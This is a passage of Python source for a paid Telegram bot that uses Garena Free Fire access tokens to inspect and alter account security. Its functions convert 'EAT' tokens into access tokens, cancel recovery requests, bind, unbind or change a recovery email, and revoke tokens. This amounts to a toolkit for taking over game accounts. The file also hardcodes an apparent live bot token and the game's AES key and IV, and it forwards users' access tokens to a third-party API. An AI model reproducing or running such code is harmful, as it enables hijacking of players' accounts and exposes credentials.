# garena_email_bot_aiogram.py
import os
import sys
import json
import time
import base64
import hashlib
import urllib.parse
import urllib3
import random
import string
import requests
import re
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
import asyncio

# ========== LOGGING IMPORT ==========
from logging_functions import log_user_action, get_user_logs, get_all_logs_since

urllib3.disable_warnings()

BOT_TOKEN = "8418234120:AAGHPDQhBLBoFvlpTGqynEm8N8CqSL9UhsA"
OWNER_ID = 8383307682

# ========== STAR SYSTEM ==========
user_stars = {}

def get_user_stars(user_id):
    return user_stars.get(user_id, 0)

def deduct_stars(user_id, amount):
    if user_stars.get(user_id, 0) >= amount:
        user_stars[user_id] = user_stars.get(user_id, 0) - amount
        return True
    return False

def add_stars(user_id, amount):
    user_stars[user_id] = user_stars.get(user_id, 0) + amount
    return True

# ========== CRYPTO IMPORTS ==========
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

try:
    from google.protobuf import descriptor as _descriptor
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except ImportError:
    os.system("pip install protobuf")
    from google.protobuf import descriptor as _descriptor
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()

# ========== PROTOBUF ==========
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')

MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')

_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())

try:
    MajorLogin = globals()['MajorLogin']
    MajorLoginRes = globals()['MajorLoginRes']
except KeyError:
    print("[!] Error: Failed to build protobuf classes.")
    sys.exit(1)

# ========== CONSTANTS ==========
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV = b'6oyZDr22E3ychjM%'
mLuRl = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"
}

PLATFORM_MAP = {
    3: "Facebook", 4: "Guest", 5: "VK", 
    6: "Huawei", 8: "Google", 11: "X (Twitter)", 13: "AppleId",
}

# ========== HELPER FUNCTIONS ==========
def enc(d): 
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d): 
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def convert_seconds(seconds):
    d, h = divmod(seconds, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    return f"{d}d {h}h {m}m {s}s"

def hash_sha256(text):
    return hashlib.sha256(text.encode('utf-8')).hexdigest()

def generate_username(length=12):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def read_varint(data, offset):
    res = 0
    shift = 0
    while True:
        if offset >= len(data):
            break
        b = data[offset]
        offset += 1
        res |= (b & 0x7f) << shift
        if not (b & 0x80):
            break
        shift += 7
    return res, offset

def parse_record(data):
    rec = {}
    offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
            if f == 1:
                rec['ts'] = val
            elif f == 2:
                rec['ram'] = val
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]
            offset += length
            if f == 3:
                rec['dev'] = val.decode(errors='ignore')
            elif f == 4:
                rec['arch'] = val.decode(errors='ignore')
        else:
            break
    return rec

def parse_history_protobuf(data):
    records = []
    offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]
            offset += length
            if f == 1:
                records.append(parse_record(val))
        else:
            break
    return records

def build_majorlogin(tok, open_id, p_type):
    m = MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def is_valid_token(token):
    if not token or len(token) < 10:
        return False
    import re
    return bool(re.match(r'^[A-Za-z0-9_\-\.]+$', token))

def is_valid_email(email):
    import re
    return bool(re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email))

def is_valid_security_code(code):
    return bool(code and code.isdigit() and len(code) == 6)

# ========== API FUNCTIONS ==========
def single_subscribe():
    return True, "✅ Single Subscribe feature is active!\n\nThis feature will be available soon."

def cancel_recovery(access):
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': access}
    headers = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    try:
        rsp = requests.post(url, data=payload, headers=headers, timeout=20)
        if rsp.status_code == 200:
            data = rsp.json()
            return True, f"Cancelled successfully.\nResponse: {data}"
        else:
            return False, f"Failed. Status: {rsp.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def check_recovery(access):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    payload = {'app_id': "100067", 'access_token': access}
    headers = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    try:
        rsp = requests.get(url, params=payload, headers=headers, timeout=20)
        if rsp.status_code == 200:
            data = rsp.json()
            email = data.get("email", "")
            email_to_be = data.get("email_to_be", "")
            mobile = data.get("mobile", "")
            mobile_to_be = data.get("mobile_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            player_info = ""
            try:
                p_url = f"https://api-otrss.garena.com/support/callback/?access_token={access}"
                p_res = requests.get(p_url, headers={'User-Agent': "Mozilla/5.0"}, timeout=10, allow_redirects=True)
                parsed = urllib.parse.urlparse(p_res.url)
                params = urllib.parse.parse_qs(parsed.query)
                uid = params.get("account_id", ["Unknown"])[0]
                nickname = urllib.parse.unquote(params.get("nickname", ["Unknown"])[0])
                region = params.get("region", ["Unknown"])[0]
                player_info = f"\n<b>Nickname:</b> {nickname}\n<b>UID:</b> {uid}\n<b>Region:</b> {region}\n"
            except:
                pass
            result_text = f"""
<b>ACCOUNT RECOVERY STATUS</b>
{player_info}
<b>Current Email:</b> {email if email else 'Not Set'}
<b>Pending Email:</b> {email_to_be if email_to_be else 'None'}
<b>Mobile:</b> {mobile if mobile else 'Not Set'}
<b>Pending Mobile:</b> {mobile_to_be if mobile_to_be else 'None'}
<b>Countdown:</b> {countdown} seconds ({convert_seconds(countdown)})

<b>Status:</b> {'Confirmed' if email and not email_to_be else 'Pending' if email_to_be else 'Not Set'}
"""
            return True, result_text
        else:
            return False, f"Failed. Status: {rsp.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def check_platform(access):
    try:
        r = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",
            params={'access_token': access},
            headers={'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "If-Modified-Since": "Sun, 18 May 2025 09:37:03 GMT"},
            timeout=20)
        if r.status_code not in [200, 201]:
            return False, "Failed to fetch platform info."
        j = r.json()
        platform_names = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei", 4: "Guest", 6: "Huawei", 13: "Apple ID"}
        
        bounded = j.get("bounded_accounts", [])
        if not isinstance(bounded, list):
            bounded = []
        
        player_info = ""
        try:
            p_url = f"https://api-otrss.garena.com/support/callback/?access_token={access}"
            p_res = requests.get(p_url, headers={'User-Agent': "Mozilla/5.0"}, timeout=10, allow_redirects=True)
            parsed = urllib.parse.urlparse(p_res.url)
            params = urllib.parse.parse_qs(parsed.query)
            uid = params.get("account_id", ["Unknown"])[0]
            nickname = urllib.parse.unquote(params.get("nickname", ["Unknown"])[0])
            region = params.get("region", ["Unknown"])[0]
            player_info = f"\n<b>Nickname:</b> {nickname}\n<b>UID:</b> {uid}\n<b>Region:</b> {region}\n"
        except:
            pass
        result_text = f"<b>Linked Platforms</b>{player_info}\n\n"
        if bounded:
            for x in bounded:
                if isinstance(x, int):
                    p = x
                    if p in platform_names:
                        result_text += f"✅ {platform_names[p]}\n"
                    else:
                        result_text += f"✅ Unknown ({p})\n"
                elif isinstance(x, dict):
                    p = x.get('platform')
                    uinfo = x.get('user_info', {})
                    e = uinfo.get('email', '')
                    n = uinfo.get('nickname', '')
                    if p in platform_names:
                        result_text += f"✅ {platform_names[p]}\n"
                        if e:
                            result_text += f"   <b>Email:</b> {e}\n"
                        if n:
                            result_text += f"   <b>Nickname:</b> {n}\n"
                        result_text += "\n"
                else:
                    result_text += f"✅ Unknown entry\n"
        else:
            result_text += "No secondary platforms linked.\n"
        available = j.get("available_platforms", [])
        if isinstance(available, list) and available:
            result_text += "\n<b>Available to Bind:</b>\n"
            for p in available:
                if p in platform_names:
                    result_text += f"   • {platform_names[p]}\n"
        return True, result_text
    except Exception as e:
        return False, f"Error: {str(e)}"

def get_token_details(access):
    try:
        url = "https://100067.connect.garena.com/oauth/token/inspect"
        params = {'token': access}
        headers = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)"}
        r = requests.get(url, params=params, headers=headers, timeout=20)
        player_info = ""
        try:
            p_url = f"https://api-otrss.garena.com/support/callback/?access_token={access}"
            p_res = requests.get(p_url, headers={'User-Agent': "Mozilla/5.0"}, timeout=10, allow_redirects=True)
            parsed = urllib.parse.urlparse(p_res.url)
            params = urllib.parse.parse_qs(parsed.query)
            uid = params.get("account_id", ["Unknown"])[0]
            nickname = urllib.parse.unquote(params.get("nickname", ["Unknown"])[0])
            region = params.get("region", ["Unknown"])[0]
            player_info = f"\n<b>Nickname:</b> {nickname}\n<b>UID:</b> {uid}\n<b>Region:</b> {region}\n"
        except:
            pass
        if r.status_code == 200:
            data = r.json()
            result_text = f"""
<b>TOKEN DETAILS</b>
{player_info}
<b>Open ID:</b> {data.get('open_id', 'N/A')}
<b>User ID:</b> {data.get('user_id', 'N/A')}
<b>App ID:</b> {data.get('app_id', 'N/A')}
<b>Expires At:</b> {data.get('expires_at', 'N/A')}
<b>Region:</b> {data.get('region', 'N/A')}
<b>Scope:</b> {data.get('scope', 'N/A')}
"""
            return True, result_text
        else:
            try:
                r2 = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",
                    params={'access_token': access},
                    headers={'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)"},
                    timeout=20)
                if r2.status_code == 200:
                    data = r2.json()
                    result_text = f"""
<b>TOKEN DETAILS</b>
{player_info}
<b>Token is valid</b>
<b>App ID:</b> 100067
<b>Region:</b> {data.get('region', 'N/A')}

<b>Linked Accounts:</b>
{len(data.get('bounded_accounts', []))} accounts linked
"""
                    return True, result_text
            except:
                pass
            return False, "Token is invalid or expired."
    except Exception as e:
        return False, f"Error: {str(e)}"

def unbind_email(email, access, otp=None, secondary_password=None):
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    identity_token = None
    if otp:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email,
            "otp": otp,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    elif secondary_password:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email,
            "secondary_password": secondary_password,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    if not identity_token:
        return False, "Failed to verify identity."
    unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    unbind_data = {
        "app_id": "100067",
        "access_token": access,
        "identity_token": identity_token
    }
    try:
        resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=20)
        if '"result":0' in resp.text.replace(" ", ""):
            return True, "Unbind request created successfully."
        else:
            return False, f"Failed: {resp.text}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def revoke_token(access):
    url = f"https://100067.connect.garena.com/oauth/logout?access_token={access}"
    try:
        r = requests.get(url, timeout=20)
        if r.text.strip() == '{"result":0}':
            return True, "Token revoked successfully."
        else:
            return False, f"Failed: {r.text}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def change_bind_email(access, old_email, new_email, otp_old=None, otp_new=None, secondary_password=None):
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    identity_token = None
    if otp_old:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": old_email,
            "otp": otp_old,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    elif secondary_password:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": old_email,
            "secondary_password": secondary_password,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    if not identity_token:
        return False, "Failed to verify identity for old email."
    verifier_token = None
    if otp_new:
        verify_otp_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        verify_otp_data = {
            "email": new_email,
            "otp": otp_new,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_otp_url, headers=headers, data=verify_otp_data, timeout=20)
            verifier_token = resp.json().get("verifier_token")
        except:
            pass
    if not verifier_token:
        return False, "Failed to verify new email OTP."
    rebind_url = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
    rebind_data = {
        'identity_token': identity_token,
        'email': new_email,
        'app_id': '100067',
        'verifier_token': verifier_token,
        'access_token': access
    }
    try:
        resp = requests.post(rebind_url, headers=headers, data=rebind_data, timeout=20)
        if '"result":0' in resp.text.replace(" ", ""):
            return True, "Email change request created successfully."
        else:
            return False, f"Failed: {resp.text}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def bind_email(token, email, otp, security_code):
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    send_otp_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    send_otp_data = {
        "email": email,
        "locale": "en_PK",
        "region": "PK",
        "app_id": "100067",
        "access_token": token
    }
    try:
        requests.post(send_otp_url, headers=headers, data=send_otp_data, timeout=20)
    except:
        pass
    
    verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    verify_data = {
        "app_id": "100067",
        "access_token": token,
        "email": email,
        "otp": otp,
        "code": otp,
        "type": "1"
    }
    try:
        resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
        verifier_token = resp.json().get("verifier_token")
        if not verifier_token:
            return False, "Failed to verify OTP."
    except:
        return False, "Failed to verify OTP."
    
    bind_url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    bind_data = {
        "email": email,
        "app_id": "100067",
        "access_token": token,
        "verifier_token": verifier_token,
        "secondary_password": hash_sha256(security_code)
    }
    try:
        resp = requests.post(bind_url, headers=headers, data=bind_data, timeout=20)
        if '"result":0' in resp.text.replace(" ", ""):
            return True, "Email bound successfully."
        else:
            return False, f"Failed: {resp.text}"
    except Exception as e:
        return False, f"Error: {str(e)}"

def eat_to_access_token(eat_input):
    try:
        eat_token = None
        if "http" in eat_input or "?" in eat_input:
            parsed = urllib.parse.urlparse(eat_input)
            params = urllib.parse.parse_qs(parsed.query)
            if 'eat' in params:
                eat_token = params['eat'][0]
        else:
            eat_token = eat_input.strip()
        if not eat_token:
            return False, "Could not find EAT token."
        url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36"}
        response = requests.get(url, headers=headers, allow_redirects=True, timeout=15)
        parsed = urllib.parse.urlparse(response.url)
        params = urllib.parse.parse_qs(parsed.query)
        if 'access_token' in params:
            access_token = params['access_token'][0]
            account_id = params.get('account_id', ['Unknown'])[0]
            nickname = urllib.parse.unquote(params.get('nickname', ['Unknown'])[0])
            region = params.get('region', ['Unknown'])[0]
            result = f"""
<b>EAT to Access Token Conversion</b>

<b>Nickname:</b> {nickname}
<b>Account ID:</b> {account_id}
<b>Region:</b> {region}

<b>Access Token:</b>
{access_token}
"""
            return True, result
        else:
            return False, "Failed to extract access token. Token might be expired."
    except Exception as e:
        return False, f"Error: {str(e)}"

# ========== LONG BIO UPDATE (FAST - DIRECT API) ==========
def update_long_bio_fast(access_token, bio_text):
    """Long Bio Update - Fast (Direct API Call)"""
    try:
        api_url = "https://drogon-bio-api.vercel.app/bio"
        params = {
            "access": access_token,
            "bio": bio_text,
            "region": "IND"
        }
        
        response = requests.get(api_url, params=params, timeout=10)
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get('success'):
                    return True, f"""
<b>✅ LONG BIO UPDATED!</b>

<b>Name:</b> {data.get('name', 'N/A')}
<b>UID:</b> {data.get('uid', 'N/A')}
<b>Region:</b> {data.get('region_used', 'IND')}
<b>Bio:</b> {data.get('bio', bio_text)}
"""
                else:
                    return False, f"❌ Failed: {data.get('status', 'Unknown error')}"
            except:
                return False, "❌ Invalid response from API"
        else:
            return False, f"❌ API Error: {response.status_code}"
            
    except requests.exceptions.Timeout:
        return False, "⏳ Timeout! Please try again."
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

# ========== SUPPORT INLINE BUTTON ==========
def get_support_inline():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Support",
                    url="https://www.garena.sg/support/"
                )
            ]
        ]
    )

# ========== PAY KEYBOARD ==========
def get_pay_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Pay ★ 10",
                    callback_data="pay_revoke"
                )
            ],
            [
                InlineKeyboardButton(
                    text="Support Me",
                    url="https://www.garena.sg/support/"
                )
            ]
        ]
    )
    return keyboard

# ========== BOT KEYBOARD ==========
def get_main_keyboard():
    keyboard = [
        [
            KeyboardButton(text="Add Recovery Email", style="success"),
            KeyboardButton(text="Check Recovery Email", style="success")
        ],
        [
            KeyboardButton(text="Check Platform", style="success"),
            KeyboardButton(text="Cancel Recovery Email", style="success")
        ],
        [
